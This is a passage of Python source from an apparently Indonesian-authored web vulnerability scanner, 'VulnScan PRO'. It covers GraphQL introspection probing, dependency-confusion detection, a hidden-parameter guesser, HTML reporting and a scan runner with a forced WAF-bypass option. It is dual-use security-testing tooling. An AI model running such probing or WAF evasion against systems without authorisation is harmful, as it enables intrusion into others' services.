            if not resp or resp["status"] != 200: continue
            if len(resp["body"]) < 10: continue
            packages = self._extract_packages(path, resp["body"])
            if not packages: continue
            internal = self._identify_internal(packages)
            if internal:
                result.add(Finding(self.NAME, Severity.HIGH,
                    f"Dependency Confusion Risk — {path}",
                    "Manifest publik mengekspos package internal. "
                    "Risiko supply-chain attack via registry publik.",
                    f"File: {base+path}\n"
                    f"Possible internal: {sorted(internal)[:8]}\n"
                    f"Total: {len(packages)} packages",
                    "Gunakan scoped packages. Private registry. Lockfile integrity.",
                    7.5,"CWE-427",base+path,["supply-chain","dep-confusion"]))
            elif packages:
                result.add(Finding(self.NAME, Severity.MEDIUM,
                    f"Package Manifest Publik — {path}",
                    "Dependency list terekspos — berguna untuk reconnaissance.",
                    f"File: {base+path}\nTotal: {len(packages)}\n"
                    f"Sample: {', '.join(list(packages)[:6])}",
                    "Batasi akses ke manifest jika tidak diperlukan publik.",
                    4.3,"CWE-200",base+path,["supply-chain","info"]))

    def _extract_packages(self, path: str, body: str) -> Set[str]:
        packages: Set[str] = set()
        try:
            if "package.json" in path:
                data = json.loads(body)
                for sec in ["dependencies","devDependencies","peerDependencies"]:
                    packages.update(data.get(sec, {}).keys())
            elif "requirements" in path or "setup.py" in path or \
                 "Pipfile" in path or "pyproject.toml" in path:
                for line in body.splitlines():
                    line = line.strip()
                    if not line or line.startswith(("#","[","-r","--")): continue
                    pkg = re.split(r'[=<>!;\s\[]', line)[0].strip()
                    if pkg and re.match(r'^[a-zA-Z0-9_-]+$', pkg):
                        packages.add(pkg.lower())
            elif "composer.json" in path:
                data = json.loads(body)
                for sec in ["require","require-dev"]:
                    packages.update(data.get(sec, {}).keys())
            elif "go.mod" in path:
                for line in body.splitlines():
                    m2 = re.match(r'\s+(\S+)\s+v', line)
                    if m2: packages.add(m2.group(1))
            elif "Gemfile" in path:
                for line in body.splitlines():
                    m2 = re.match(r"gem ['\"]([^'\"]+)['\"]", line)
                    if m2: packages.add(m2.group(1))
        except: pass
        return packages

    def _identify_internal(self, packages: Set[str]) -> List[str]:
        internal = []
        common_safe = {"lib","api","core","app","web","cli","sdk","ui","io",
                       "net","util","db","orm","log","kit","base","auth"}
        for pkg in packages:
            pl = pkg.lower().lstrip("@")
            if "/" in pl: pl = pl.split("/",1)[1]
            if any(kw in pl for kw in self.INTERNAL_KEYWORDS):
                internal.append(pkg); continue
            if (len(pl) <= 3 and pl not in common_safe
                    and not pkg.startswith("@")):
                internal.append(pkg)
        return internal

# ─────────────────────────────────────────────
#  v7 NEW: GraphQL Scanner
# ─────────────────────────────────────────────
class AsyncGraphQLScanner(AsyncModule):
    """
    FIX: Deteksi GraphQL endpoint, coba introspection query,
    fuzz fields dasar jika introspection tersedia.
    """
    NAME = "GraphQL"
    PATHS = ["/graphql","/graphiql","/api/graphql","/api/v1/graphql",
             "/v1/graphql","/query","/gql"]
    # FIX 6: Full introspection query — fields, args, directives, mutations
    INTROSPECTION = json.dumps({"query": """
      {
        __schema {
          types {
            name kind description
            fields {
              name
              args { name type { name kind } }
              type { name kind }
            }
          }
          queryType  { name fields { name args { name type { name kind } } } }
          mutationType { name fields { name args { name type { name kind } } } }
          directives { name description locations }
        }
      }
    """})
    INLINE_INTROSPECT = '{"query":"{__typename}"}'

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        base = url.rstrip("/")
        for path in self.PATHS:
            full = base+path
            # Cek apakah endpoint ada
            resp_get = await engine.get(full)
            if not resp_get: continue
            if resp_get["status"] in (404, 410): continue

            # Coba introspection via POST
            resp = await engine.post(
                full, data=self.INTROSPECTION,
                headers={"Content-Type":"application/json"})
            if not resp: continue

            body = resp["body"]
            # Deteksi GraphQL error (endpoint ada tapi introspection diblokir)
            if re.search(r'"errors".*"message"', body, re.I):
                result.add(Finding(self.NAME, Severity.INFO,
                    f"GraphQL Endpoint — {path}",
                    "GraphQL ditemukan. Introspection kemungkinan diblokir.",
                    f"URL: {full}\nStatus: {resp['status']}\n"
                    f"Response: {body[:200]}",
                    "Verifikasi manual apakah introspection diaktifkan.",
                    0,"",full,["graphql"]))
                continue

            # Introspection berhasil
            if '"__schema"' in body or '"types"' in body:
                result.add(Finding(self.NAME, Severity.HIGH,
                    f"GraphQL Introspection Aktif — {path}",
                    "GraphQL introspection diaktifkan di produksi. "
                    "Penyerang dapat enumerate semua types, queries, dan mutations.",
                    f"URL: {full}\nSkema tersedia.\n"
                    f"Sample: {body[:400]}",
                    "Nonaktifkan introspection di produksi.\n"
                    "Gunakan query depth limiting dan cost analysis.",
                    7.5,"CWE-200",full,["graphql","introspection"]))

                # Coba fuzz mutations
                if aggressive:
                    await self._fuzz_mutations(engine, result, full, body)

            elif resp["status"] == 200:
                result.add(Finding(self.NAME, Severity.MEDIUM,
                    f"GraphQL Endpoint Terdeteksi — {path}",
                    "GraphQL endpoint aktif.",
                    f"URL: {full}\nStatus: 200",
                    "Audit semua queries/mutations.",
                    4.3,"",full,["graphql"]))

    async def _fuzz_mutations(self, engine, result, url, schema_body):
        """Basic mutation fuzzing jika introspection tersedia."""
        mutations = []
        for m in re.finditer(r'"name":"(\w+)".*?"kind":"MUTATION"',
                             schema_body, re.I):
            mutations.append(m.group(1))
        if mutations:
            result.add(Finding(self.NAME, Severity.MEDIUM,
                f"GraphQL Mutations Ditemukan: {mutations[:5]}",
                "Mutations yang terekspos via introspection.",
                f"URL: {url}\nMutations: {mutations[:10]}",
                "Implementasikan proper authorization per mutation.",
                5.4,"CWE-284",url,["graphql","mutations"]))

# ─────────────────────────────────────────────
#  HTML REPORT GENERATOR — FIX: html.escape()
# ─────────────────────────────────────────────
def _esc(s: str) -> str:
    """
    FIX: Escape semua output user ke HTML agar tidak terjadi XSS di laporan.
    Penting karena finding bisa mengandung </script> dari payload scan.
    """
    return html_lib.escape(str(s) if s else "", quote=True)

class HTMLReport:
    @staticmethod
    def generate(result: ScanResult, path: str, ei: dict = None):
        counts = result.count_by_severity()
        score  = result.risk_score
        dur    = int((result.end_time-result.start_time).total_seconds()) \
                 if result.end_time else 0
        ei     = ei or {}
        sc     = {"CRITICAL":"#ff4444","HIGH":"#ff8800",
                  "MEDIUM":"#ffcc00","LOW":"#44aaff","INFO":"#888888"}

        def fhtml():
            out = ""
            chains = [f for f in result.findings if f.module=="Attack Chain"]
            others = [f for f in result.findings if f.module!="Attack Chain"]
            if chains:
                out += """<div class="sg chain-section">
<h3 style="color:#ff4444;border-left:4px solid #ff4444;padding-left:12px">
⛓️ ATTACK CHAIN ANALYSIS</h3>"""
                for i,f in enumerate(chains,1):
                    col = sc.get(f.severity.value,"#888")
                    out += f"""<div class="fd chain-card" style="border-left:3px solid {col}">
  <div class="fh" onclick="this.closest('.fd').classList.toggle('open')">
    <span class="fn">{i}</span>
    <strong>{_esc(f.title)}</strong>
    <span class="badge" style="background:{col}">{_esc(f.severity.value)}</span>
    {"<span class='badge cv'>CVSS "+_esc(str(f.cvss))+"</span>" if f.cvss else ""}
  </div>
  <div class="fb">
    <div class="fi"><label>Description</label>
      <p>{_esc(f.description)}</p></div>
    {"<div class='fi'><label>Evidence</label><pre>"+_esc(f.evidence)+"</pre></div>" if f.evidence else ""}
    {"<div class='fi'><label>Remediation</label><p class='rem'>"+_esc(f.remediation)+"</p></div>" if f.remediation else ""}
  </div></div>"""
                out += "</div>"
            for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
                grp = [f for f in others if f.severity.value==sev]
                if not grp: continue
                col = sc[sev]
                out += (f'<div class="sg"><h3 style="color:{col};border-left:4px'
                        f' solid {col};padding-left:12px">'
                        f'{sev} &mdash; {len(grp)}</h3>')
                for i,f in enumerate(grp,1):
                    tags_html = "".join(
                        f"<span class='badge tag'>{_esc(t)}</span>"
                        for t in f.tags[:3]) if f.tags else ""
                    out += f"""<div class="fd" style="border-left:3px solid {col}">
  <div class="fh" onclick="this.closest('.fd').classList.toggle('open')">
    <span class="fn">{i}</span>
    <strong>{_esc(f.title)}</strong>
    <span class="badge" style="background:{col}">{_esc(sev)}</span>
    {"<span class='badge cv'>CVSS "+_esc(str(f.cvss))+"</span>" if f.cvss else ""}
    {"<span class='badge cw'>"+_esc(f.cwe)+"</span>" if f.cwe else ""}
    {tags_html}
  </div>
  <div class="fb">
    <div class="fi"><label>Module</label><span>{_esc(f.module)}</span></div>
    <div class="fi"><label>Endpoint</label>
      <code>{_esc(f.endpoint or result.target)}</code></div>
    <div class="fi"><label>Description</label>
      <p>{_esc(f.description)}</p></div>
    {"<div class='fi'><label>Evidence</label><pre>"+_esc(f.evidence)+"</pre></div>" if f.evidence else ""}
    {"<div class='fi'><label>Remediation</label><p class='rem'>"+_esc(f.remediation)+"</p></div>" if f.remediation else ""}
  </div></div>"""
                out += "</div>"
            return out

        waf = result.waf_info
        waf_badge = ""
        if waf.get("detected"):
            waf_badge = (f"<span class='pill' style='color:#ff8800'>"
                        f"🛡️ WAF: {_esc(waf['name'])} ({waf['confidence']}%)</span>")
        dns_badge = ("<span class='pill' style='color:#3fb950'>⚡ aiodns</span>"
                     if AIODNS_OK else "")
        rc = "#ff4444" if score>=70 else "#ff8800" if score>=40 else "#44cc44"
        rl = ("CRITICAL" if score>=70 else "HIGH" if score>=40 else
              "MEDIUM"   if score>=20 else "LOW")
        api_html = ""
        if result.api_endpoints:
            api_html = (f"<div class='sec'><h2>⚡ API Endpoints "
                       f"({len(result.api_endpoints)})</h2><div class='api-list'>")
            for ep in result.api_endpoints[:20]:
                params_str = _esc(", ".join(ep.get("params",{}).keys()))
                api_html += (f"<div class='api-item'>"
                            f"<span class='method {_esc(ep['method'].lower())}'>"
                            f"{_esc(ep['method'])}</span>"
                            f"<code>{_esc(ep['url'][:80])}</code>"
                            f"<span class='params'>{params_str}</span>"
                            f"</div>")
            api_html += "</div></div>"

        html = f"""<!DOCTYPE html><html lang="id"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>VulnScan PRO — {_esc(result.target)}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0d1117;color:#e6edf3;line-height:1.6}}
.hdr{{background:linear-gradient(135deg,#161b22,#0d1117);border-bottom:1px solid #30363d;padding:24px 32px;display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:12px}}
.hdr h1{{font-size:22px;font-weight:700}}.hdr h1 span{{color:#f85149}}
.meta{{color:#8b949e;font-size:13px;line-height:1.9;text-align:right}}
.pills{{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}}
.pill{{background:#21262d;border:1px solid #30363d;border-radius:12px;padding:3px 10px;font-size:11px;color:#58a6ff}}
.rb{{background:#161b22;border:1px solid #30363d;border-radius:10px;margin:16px 32px;padding:18px;display:flex;align-items:center;gap:18px;flex-wrap:wrap}}
.rs{{font-size:48px;font-weight:900;color:{rc};min-width:90px}}
.rw{{flex:1;min-width:200px}}.rl{{font-size:15px;font-weight:700;color:{rc};margin-bottom:3px}}
.rbar{{height:9px;background:#21262d;border-radius:5px;overflow:hidden;margin:5px 0}}
.rbf{{height:100%;width:{min(score,100):.0f}%;background:linear-gradient(90deg,{rc},{rc}88);border-radius:5px}}
.perf{{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}}
.pi{{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:6px 11px;font-size:12px}}
.pi strong{{color:#58a6ff}}
.stats{{display:flex;gap:8px;margin:0 32px 16px;flex-wrap:wrap}}
.sc2{{flex:1;min-width:80px;background:#161b22;border:1px solid #30363d;border-radius:10px;padding:10px;text-align:center}}
.sc2 .n{{font-size:28px;font-weight:900;margin-bottom:1px}}.sc2 .l{{font-size:10px;color:#8b949e;text-transform:uppercase}}
.sc2.c{{border-top:3px solid #ff4444}}.sc2.c .n{{color:#ff4444}}
.sc2.h{{border-top:3px solid #ff8800}}.sc2.h .n{{color:#ff8800}}
.sc2.m{{border-top:3px solid #ffcc00}}.sc2.m .n{{color:#ffcc00}}
.sc2.l2{{border-top:3px solid #44aaff}}.sc2.l2 .n{{color:#44aaff}}
.sc2.i{{border-top:3px solid #888}}.sc2.i .n{{color:#888}}
.sec{{margin:16px 32px;background:#161b22;border:1px solid #30363d;border-radius:10px;padding:20px}}
.sec h2{{font-size:15px;margin-bottom:14px;padding-bottom:8px;border-bottom:1px solid #30363d}}
.chain-section{{border-color:#ff4444!important;background:#0d0505!important}}
.sg{{margin-bottom:20px}}.sg h3{{font-size:13px;margin-bottom:8px;padding:6px 10px;border-radius:6px}}
.fd{{background:#0d1117;border:1px solid #30363d;border-radius:8px;margin-bottom:7px;overflow:hidden}}
.fh{{padding:10px 14px;display:flex;align-items:center;gap:7px;flex-wrap:wrap;cursor:pointer;background:#161b22}}
.fh:hover{{background:#1c2128}}
.fn{{background:#30363d;color:#8b949e;width:19px;height:19px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;flex-shrink:0}}
.fb{{padding:12px;display:none}}.fd.open .fb{{display:block}}
.fi{{margin-bottom:9px}}.fi label{{font-size:10px;text-transform:uppercase;letter-spacing:.4px;color:#8b949e;display:block;margin-bottom:2px}}
.fi code{{background:#21262d;padding:2px 6px;border-radius:4px;font-size:11px;word-break:break-all}}
.fi pre{{background:#21262d;padding:9px;border-radius:6px;font-size:11px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;color:#a5d6ff}}
.fi p{{font-size:13px;color:#c9d1d9}}.rem{{color:#3fb950!important}}
.badge{{font-size:10px;font-weight:700;padding:2px 6px;border-radius:10px;color:#fff}}
.cv{{background:#30363d;color:#e6edf3}}.cw{{background:#21262d;color:#8b949e}}
.tag{{background:#0d2137;color:#58a6ff}}
.el{{list-style:none;display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:4px}}
.el li code{{background:#21262d;padding:3px 8px;border-radius:4px;font-size:11px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}}
.api-list{{display:flex;flex-direction:column;gap:5px}}
.api-item{{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:7px 10px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}}
.method{{font-size:10px;font-weight:700;padding:2px 7px;border-radius:4px;min-width:40px;text-align:center}}
.method.get{{background:#1a4a1a;color:#3fb950}}.method.post{{background:#4a1a1a;color:#f85149}}
.params{{font-size:11px;color:#8b949e}}
.btn{{background:#21262d;border:none;color:#58a6ff;cursor:pointer;padding:5px 12px;border-radius:6px;font-size:12px;margin-bottom:10px}}
.btn:hover{{background:#30363d}}
.foot{{text-align:center;padding:24px;color:#8b949e;font-size:11px;border-top:1px solid #30363d;margin-top:24px}}
.disc{{background:#1a1000;border:1px solid #ff8800;border-radius:6px;padding:10px 14px;margin-bottom:12px;font-size:12px;color:#ffcc00}}
</style></head><body>
<div class="hdr">
  <div>
    <h1>🛡️ VulnScan <span>PRO</span></h1>
    <div style="color:#8b949e;font-size:12px;margin-top:3px">
      asyncio.Lock · async_playwright · asyncio.open_connection · html.escape · UA rotation</div>
    <div class="pills">
      <span class="pill">⚡ aiohttp</span>
      <span class="pill">🔒 asyncio.Lock</span>
      <span class="pill">🌐 Async DNS</span>
      <span class="pill">💾 SQLite via asyncio.to_thread</span>
      <span class="pill">🔓 SSRF·XXE·IDOR·JWT·GraphQL</span>
      {waf_badge}{dns_badge}
    </div>
  </div>
  <div class="meta">
    <div><strong>Target:</strong> {_esc(result.target)}</div>
    <div><strong>Scan:</strong> {_esc(result.start_time.strftime('%Y-%m-%d %H:%M:%S'))}</div>
    <div><strong>Duration:</strong> {dur}s &nbsp;|&nbsp; <strong>Req/s:</strong> {ei.get('rps',0):.1f}</div>
    <div><strong>Findings:</strong> {len(result.findings)}</div>
    <div><strong>DNS:</strong> {'aiodns' if AIODNS_OK else 'socket'}</div>
    <div><strong>SPA:</strong> {'async_playwright' if PLAYWRIGHT_ASYNC else 'sync_playwright' if PLAYWRIGHT_OK else 'n/a'}</div>
  </div>
</div>
<div class="rb">
  <div><div class="rs">{score:.0f}</div>
    <div style="color:#8b949e;font-size:11px">/ 100</div></div>
  <div class="rw">
    <div class="rl">{rl} RISK</div>
    <div class="rbar"><div class="rbf"></div></div>
    <div class="perf">
      <div class="pi">Requests <strong>{ei.get('total',0)}</strong></div>
      <div class="pi">Speed <strong>{ei.get('rps',0):.1f} rps</strong></div>
      <div class="pi">Duration <strong>{dur}s</strong></div>
      <div class="pi">Workers <strong>{ei.get('workers',0)}</strong></div>
    </div>
  </div>
</div>
<div class="stats">
  <div class="sc2 c"><div class="n">{counts[Severity.CRITICAL]}</div><div class="l">Critical</div></div>
  <div class="sc2 h"><div class="n">{counts[Severity.HIGH]}</div><div class="l">High</div></div>
  <div class="sc2 m"><div class="n">{counts[Severity.MEDIUM]}</div><div class="l">Medium</div></div>
  <div class="sc2 l2"><div class="n">{counts[Severity.LOW]}</div><div class="l">Low</div></div>
  <div class="sc2 i"><div class="n">{counts[Severity.INFO]}</div><div class="l">Info</div></div>
</div>
{"<div class='sec'><h2>🖥️ Server Info</h2>"+"".join(f"<div style='margin:4px 0'><code>{_esc(k)}</code>: <strong>{_esc(v)}</strong></div>" for k,v in result.server_info.items())+"</div>" if result.server_info else ""}
<div class="sec">
  <div class="disc">⚠️ <strong>DISCLAIMER</strong>: Laporan ini hanya untuk security testing yang sah. 
  JWT analyzer hanya men-decode claims tanpa verifikasi signature. 
  IDOR findings memerlukan verifikasi manual. Unauthorized use is illegal.</div>
  <h2>🔍 Findings ({len(result.findings)})</h2>
  <button class="btn" onclick="toggleAll()">Expand All</button>
  {fhtml()}
</div>
{api_html}
{"<div class='sec'><h2>🕷️ Endpoints ("+str(len(result.endpoints))+")</h2><ul class='el'>"+"".join(f"<li><code>{_esc(e)}</code></li>" for e in result.endpoints[:50])+"</ul></div>" if result.endpoints else ""}
{"<div class='sec'><h2>🌐 Subdomains ("+str(len(result.subdomains))+")</h2><ul class='el'>"+"".join(f"<li><code>{_esc(s)}</code></li>" for s in result.subdomains)+"</ul></div>" if result.subdomains else ""}
<div class="foot">VulnScan PRO &nbsp;·&nbsp;
{_esc(result.end_time.strftime('%Y-%m-%d %H:%M:%S') if result.end_time else '')} &nbsp;·&nbsp;
<strong style="color:#f85149">Authorized security testing only</strong></div>
<script>
/* Note: template strings below are safe — all user content escaped server-side */
document.querySelectorAll('.fh').forEach(h=>
    h.addEventListener('click',()=>h.closest('.fd').classList.toggle('open')));
function toggleAll(){{
    const anyOpen=document.querySelectorAll('.fd.open').length>0;
    document.querySelectorAll('.fd').forEach(f=>f.classList.toggle('open',!anyOpen));
    document.querySelector('.btn').textContent=anyOpen?'Expand All':'Collapse All';
}}
</script></body></html>"""
        with open(path,"w",encoding="utf-8") as fp:
            fp.write(html)

# ─────────────────────────────────────────────
#  v7 NEW: HIDDEN PARAMETER GUESSER
# ─────────────────────────────────────────────
class AsyncParamGuesser:
    """
    Mencari hidden/undocumented parameter dengan mengirim
    wordlist ke endpoint dan membandingkan respons baseline.
    Heuristik: status berubah atau panjang konten berubah > 20 bytes
    → parameter berpengaruh → masuk antrean scan SQLi/XSS/IDOR.
    """
    NAME     = "Param Guesser"
    DEFAULT_WORDLIST = [
        "id","page","file","dir","url","redirect","lang","path",
        "debug","test","q","search","query","keyword","term",
        "key","token","ref","source","from","to","type","action",
        "mode","view","format","callback","next","return","data",
        "input","value","name","user","admin","config","load",
        "include","template","theme","style","content","cat",
        "category","tag","post","article","item","product","order",
        "account","profile","report","download","export","upload",
        "preview","version","api","endpoint","service","method",
    ]

    def __init__(self, engine, wordlist=None, max_concurrent=10):
        self.engine    = engine
        self.wordlist  = wordlist or self.DEFAULT_WORDLIST
        self.semaphore = asyncio.Semaphore(max_concurrent)

    async def run_guess(self, base_url: str) -> list:
        """
        Scan hidden parameter pada base_url.
        Return: list dict {param, url, status, length, reflected, note}
        """
        from urllib.parse import urlencode, urlsplit, urlunsplit, parse_qs
        await self.engine._ensure_ready()

        parsed      = urlsplit(base_url)
        original_qs = parse_qs(parsed.query)

        # Ambil baseline
        try:
            async with self.engine._session.get(
                    base_url, ssl=self.engine._ssl,
                    allow_redirects=False) as r:
                baseline_status = r.status
                baseline_len    = len(await r.text(errors="replace"))
        except Exception:
            return []

        results = []
        lock    = asyncio.Lock()

        # FIX 7: Probe dengan beberapa nilai umum — lebih sulit dideteksi/difilter
        PROBE_VALUES = ["1", "test", "null", "true", "random123"]

        async def _check(param):
            async with self.semaphore:
                for probe_val in PROBE_VALUES:
                    test_qs        = {k: v for k,v in original_qs.items()}
                    test_qs[param] = [probe_val]
                    new_query = urlencode(test_qs, doseq=True)
                    test_url  = urlunsplit(parsed._replace(query=new_query))
                    try:
                        async with self.engine._session.get(
                                test_url, ssl=self.engine._ssl,
                                allow_redirects=False) as r:
                            body   = await r.text(errors="replace")
                            status = r.status
                            length = len(body)
                            diff   = abs(length - baseline_len)

                            if status != baseline_status or diff > 20:
                                reflected = probe_val in body
                                async with lock:
                                    results.append({
                                        "param":     param,
                                        "url":       test_url,
                                        "status":    status,
                                        "length":    length,
                                        "diff":      diff,
                                        "reflected": reflected,
                                        "note":      f"Hidden param — probe '{probe_val}'",
                                    })
                                return  # parameter terkonfirmasi, tidak perlu probe lain
                    except Exception:
                        pass

        await asyncio.gather(
            *[_check(p) for p in self.wordlist],
            return_exceptions=True)

        return results

# ─────────────────────────────────────────────
#  UTILS
# ─────────────────────────────────────────────
def normalize_url(u):
    if not u.startswith(("http://","https://")): u="https://"+u
    return u.rstrip("/")

def print_banner():
    dns_note = g("aiodns") if AIODNS_OK else y("socket (pip install aiodns)")
    spa_note = (g("async_playwright") if PLAYWRIGHT_ASYNC else
                y("sync_playwright (upgrade: pip install playwright)") if PLAYWRIGHT_OK
                else dim("none (pip install playwright)"))
    print(f"""{C.RED}{C.BOLD}
 ██╗   ██╗ ██████╗     ██████╗ ██████╗
 ██║   ██║██╔════╝     ╚════██╗╚════██╗
 ██║   ██║███████╗      █████╔╝ █████╔╝
 ╚██╗ ██╔╝╚════██║     ██╔═══╝ ██╔═══╝
  ╚████╔╝ ██████╔╝     ███████╗███████╗
   ╚═══╝  ╚═════╝      ╚══════╝╚══════╝
{C.RESET}{C.CYAN}  VULNSCAN PRO{C.RESET} — {C.MAGENTA}Full Async Fix Edition{C.RESET}
{C.GREEN}  DNS : {dns_note}{C.RESET}
{C.GREEN}  SPA : {spa_note}{C.RESET}
{C.YELLOW}  ⚠  Authorized security testing only.{C.RESET}""")

def save_json(result, path, ei=None):
    data = {
        "meta": {"tool":"VulnScan PRO","target":result.target,
                 "start":result.start_time.isoformat(),
                 "end":result.end_time.isoformat() if result.end_time else None,
                 "risk_score":result.risk_score,"engine":ei or {}},
        "waf_info":result.waf_info,"summary":{s.value:cnt for s,cnt
                    in result.count_by_severity().items()},
        "server_info":result.server_info,"subdomains":result.subdomains,
        "endpoints":result.endpoints[:100],"api_endpoints":result.api_endpoints[:50],
        "findings":[f.to_dict() for f in result.findings],
        "errors":result.errors}
    with open(path,"w",encoding="utf-8") as fp:
        json.dump(data,fp,indent=2,ensure_ascii=False)

def spinner_line(mod_name):
    frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    stop   = threading.Event()
    def _spin():
        i=0
        while not stop.is_set():
            print(f"\r  {C.CYAN}{frames[i%10]}{C.RESET} {mod_name:<42} "
                  f"{C.DIM}scanning...{C.RESET}",end="",flush=True)
            time.sleep(0.08); i+=1
        print("\r"+" "*74+"\r",end="",flush=True)
    t = threading.Thread(target=_spin,daemon=True); t.start()
    return stop, t

def print_summary(result, ei=None):
    counts = result.count_by_severity()
    score  = result.risk_score
    dur    = int((result.end_time-result.start_time).total_seconds()) \
             if result.end_time else 0
    ei = ei or {}
    W2 = 72
    print(f"\n\n{'═'*W2}")
    print(bold(f"  📋  LAPORAN — VulnScan PRO"))
    print(f"  {c('Target')}   : {w(result.target)}")
    if result.waf_info.get("detected"):
        print(f"  {c('WAF')}      : {y(result.waf_info['name'])} "
              f"({result.waf_info['confidence']}%)")
    print(f"  {c('Engine')}   : aiohttp · asyncio.Lock · asyncio.open_connection")
    print(f"  {c('DNS')}      : {g('aiodns') if AIODNS_OK else y('socket')}")
    print(f"  {c('SPA')}      : {g('async_playwright') if PLAYWRIGHT_ASYNC else y('sync') if PLAYWRIGHT_OK else dim('n/a')}")
    print(f"  {c('Speed')}    : {g(str(round(ei.get('rps',0),1))+' req/s')}")
    print("═"*W2)
    rc2 = r if score>=70 else y if score>=40 else g
    bar = "█"*int(score/2.5)+"░"*(40-int(score/2.5))
    lbl = (r("KRITIS") if score>=70 else y("TINGGI") if score>=40 else
           c("SEDANG") if score>=20 else g("RENDAH"))
    print(f"\n  RISK  : {rc2(f'{score:.1f}/100')}  {lbl}")
    print(f"  [{bar}]")
    print(f"\n  {'─'*30}")
    for sev in list(Severity):
        n = counts[sev]; ic = SEV_ICON[sev]; cl = SEV_COLOR[sev]
        b2 = "▓"*min(n,12)+("─" if n==0 else "")
        print(f"  {ic} {cl}{sev.value:<9}{C.RESET} {C.BOLD}{n:>3}{C.RESET}  {b2}")
    chains = [f for f in result.findings
              if f.module=="Attack Chain" and "chain-0" in f.title]
    if chains:
        print(f"\n  {m('⛓️  ATTACK CHAINS:')}")
        for ch in chains:
            print(f"    {y('→')} {ch.title}")
    if result.errors:
        print(f"\n  {y('ERRORS')}")
        for e in result.errors[:5]: print(f"    {r('!')} {e}")
    print(f"\n{'═'*W2}\n")

# ─────────────────────────────────────────────
#  MAIN ASYNC RUNNER
# ─────────────────────────────────────────────
async def run_scan_async(target, args, paths, subdomains,
                         resume_result: Optional[ScanResult] = None,
                         checkpoint_db: Optional[str] = None):
    aggressive = getattr(args, 'aggressive', False)
    # FIX: --waf-bypass forces bypass mutation regardless of WAF detection
    force_bypass = getattr(args, 'waf_bypass', False)

    engine = AsyncEngine(
        max_workers   = getattr(args, 'workers',    20),
        rps           = getattr(args, 'rps',        10.0),
        login_url     = getattr(args, 'login_url',  None),
        username      = getattr(args, 'username',   None),
        password      = getattr(args, 'password',   None),
        verify_ssl    = getattr(args, 'verify_ssl', False),
        cacert        = getattr(args, 'cacert',     None),   # FIX 12
        bearer_token  = getattr(args, 'token',      None),   # FIX 14
    )
    # FIX 2b: --port-timeout diteruskan ke port scanner via engine attribute
    engine._port_timeout = getattr(args, 'port_timeout', None)
    await engine._ensure_ready()

    if resume_result:
        result = resume_result
        print(f"  {g('✓')}  Resume: {len(result.findings)} findings, "
              f"completed: {result.completed_modules}")
    else:
        result = ScanResult(target=target, start_time=datetime.datetime.now())

    # FIX 13: asyncio.Lock khusus checkpoint — cegah "database is locked"
    # saat banyak modul menyimpan checkpoint secara bersamaan
    _checkpoint_lock = asyncio.Lock()

    async def _checkpoint():
        if checkpoint_db:
            async with _checkpoint_lock:
                try:
                    await asyncio.to_thread(
                        result.save_checkpoint_sqlite, checkpoint_db)
                except Exception as e:
                    result.errors.append(f"Checkpoint error: {e}")
                    logger.debug(traceback.format_exc())

    def _should_skip(mod_name):
        return mod_name in result.completed_modules

    # ── WAF Detection ─────────────────────────────────────────────
    if not _should_skip("WAF Detector"):
        stop, t = spinner_line("WAF Detector")
        waf_detector = WAFDetector()
        waf_info = await waf_detector.detect(engine, target, result)
        stop.set(); t.join()
        # FIX: --waf-bypass paksa bypass meski WAF tidak terdeteksi
        if force_bypass and not waf_info["detected"]:
            waf_info["bypass_strategy"] = "case_mutation+double_encode"
            waf_info["_forced"] = True
            print(f"  [{y('⚡ bypass forced'):<22}] {bold('WAF Detector'):<42} "
                  f"{dim('--waf-bypass aktif')}")
        elif waf_info["detected"]:
            print(f"  [{y('🛡 '+waf_info['name']):<22}] {bold('WAF Detector'):<42} "
                  f"{dim(str(waf_info['confidence'])+'%')}")
        else:
            print(f"  [{g('✓ no WAF detected'):<22}] {bold('WAF Detector')}")
        result.completed_modules.append("WAF Detector")
        await _checkpoint()
    else:
        waf_info = result.waf_info
        if force_bypass and waf_info.get("bypass_strategy","standard")=="standard":
            waf_info["bypass_strategy"] = "case_mutation+double_encode"
        print(f"  [{dim('- resumed'):<22}] {bold('WAF Detector')}")

    # ── Pre-Scan: Hidden Parameter Discovery ─────────────────────
    print(f"\n{p_info} Menjalankan Pre-Scan: Mencari Parameter Tersembunyi...")
    urls_to_scan = [target]

    # FIX 4 (resume): re-populate urls_to_scan dari antrian yang tersimpan
    # Ini memastikan URL yang ditemukan crawler/guesser di sesi sebelumnya
    # tetap diproses oleh modul SQLi/XSS/IDOR meski scan di-resume.
    if resume_result and result.scan_queue_urls:
        for _q_url in result.scan_queue_urls:
            if _q_url not in urls_to_scan:
                urls_to_scan.append(_q_url)
        print(f"  {g('✓')}  Queue resume: {len(result.scan_queue_urls)} URL "
              f"dari sesi sebelumnya dimuat ke urls_to_scan.")

    if not _should_skip("Param Guesser"):
        t0 = time.time()
        try:
            guesser     = AsyncParamGuesser(engine=engine)
            disc_params = await guesser.run_guess(target)
        except Exception as e:
            disc_params = []
            result.errors.append(f"Param Guesser: {e}")
            if getattr(args, 'debug', False):
                result.errors.append(traceback.format_exc())

        elapsed = time.time() - t0
        if disc_params:
            print(f" {p_success} Ditemukan {len(disc_params)} parameter potensial!")
            for item in disc_params:
                print(f"     -> Parameter: {item['param']} | "
                      f"URL: {item['url']} "
                      f"(Reflected: {item['reflected']})")
                urls_to_scan.append(item["url"])
                # Track ke scan_queue_urls agar URL ini selamat jika di-resume
                if item["url"] not in result.scan_queue_urls:
                    result.scan_queue_urls.append(item["url"])
                result.add(Finding(
                    "Param Guesser", Severity.INFO,
                    f"Hidden Parameter: '{item['param']}'",
